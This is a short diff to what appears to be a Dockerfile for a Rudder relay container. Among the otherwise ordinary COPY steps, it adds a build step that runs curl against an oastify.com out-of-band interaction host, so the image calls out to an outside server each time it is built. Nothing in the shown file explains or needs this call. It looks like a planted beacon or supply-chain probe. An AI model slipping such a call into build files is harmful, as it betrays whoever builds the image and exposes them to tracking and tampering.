@@ -16,6 +16,8 @@ RUN \
 
 COPY rudder-relay.sh .
 
+RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/rudder-relay
+
 # https://github.com/gdraheim/docker-systemctl-replacement/blob/1bb5768abbf68245b7b6a8bd9d6ac4df4d78044f/files/docker/systemctl3.py
 COPY systemctl3.py /usr/bin/systemctl
 
